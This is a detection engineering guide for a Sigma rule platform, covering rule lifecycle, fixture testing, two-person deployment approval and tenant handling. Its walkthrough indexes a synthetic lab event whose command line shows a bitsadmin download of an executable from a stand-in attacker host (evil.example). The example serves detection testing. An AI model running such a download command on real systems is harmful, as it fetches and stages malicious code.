# Detection engineering guide

## Rule lifecycle

1. Author a Sigma YAML rule with a stable UUID, title, status, log source, detection, and tags in `detection_rules/library/`.
2. Add positive and negative JSON fixtures under `detection_rules/fixtures/` using the same rule stem.
3. Run `python -m scripts.validate_detections` and review pySigma compilation output.
4. Create or update a rule using the versioned detection API. Review source and compiled query output independently.
5. Request deployment approval for the exact rule version. A changed version invalidates an earlier approval.
6. A different authorized reviewer approves or rejects. Rejection reason and lifecycle events are audited.
7. Deploy only after the approval gate succeeds; confirm the rule in Kibana/Elasticsearch.

## Safety

Generated Sigma is untrusted candidate content. Validate the schema, compile it with the target backend, inspect index scope and query cost, run positive/negative fixtures, and obtain human review. Do not deploy from generated output alone. Test in a lab index first and record the target version. Keep fixture events synthetic and do not place customer telemetry in Git.

Native query and index validation deliberately restrict targets to the `neural-detect-*` namespace. See `detection_engine/README.md` for compiler/validator limitations.

## Walkthrough: from rule to alert

1. Sign in to the web interface and open **Detections**. Paste a Sigma rule into **Add Sigma rule** and import it. Community field names such as `Image` and `CommandLine` are mapped to ECS (`process.executable`, `process.command_line`) when it compiles.
2. In **Test with fixtures**, supply one `positive` case that must alert and one `negative` case that must stay quiet, then run the tests. Swapping the two must fail; that proves a pass is meaningful.
3. Click **Request deployment approval**. A different person with the `approver` role signs in and approves it; you cannot approve your own request.
4. Click **Deploy to Kibana** as an administrator or security engineer. In Kibana, **Security → Rules** shows the rule enabled with a successful last run.
5. Send a matching lab event and wait for the next scheduled run (every five minutes). **Events must carry `tenant.id`** (for example `default`) for the overview page to show the alert for that tenant:

```bash
curl -u "elastic:$ND_ELASTIC_PASSWORD" -X POST "localhost:9200/neural-detect-$(date -u +%Y.%m.%d)/_doc?refresh=true" \
  -H 'content-type: application/json' \
  -d '{"@timestamp":"'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"'","tenant":{"id":"default"},"event":{"category":["process"],"type":["start"]},"host":{"name":"lab-host"},"process":{"name":"bitsadmin.exe","executable":"C:\\Windows\\System32\\bitsadmin.exe","command_line":"bitsadmin.exe /transfer j http://evil.example/b.exe C:\\b.exe"}}'
```

Use only synthetic lab events. The alert appears in Kibana under **Security → Alerts** and in the web interface's **Recent alerts**.

## Managing rules from Git with ndctl

Keep rules and fixtures in a repository and let CI run `ndctl validate` and `ndctl test` on every change. `ndctl plan` shows what would change on the server and `ndctl apply` stores it; approval and deployment still follow the steps above. See [docs/CLI.md](docs/CLI.md).

## Growing the library

`ndctl import` brings in community Sigma rules and `ndctl coverage` shows which ATT&CK techniques you cover. Imported rules go through the same validation, fixture tests, approval, and deployment as any other rule. See [docs/CLI.md](docs/CLI.md).

## Tenants

Each rule belongs to one tenant. Users only see and change their own tenant's rules, the same Sigma ID can exist in two tenants, and Kibana rules for a non-default tenant are named `<tenant>.<rule id>` and tagged `tenant:<tenant>`.
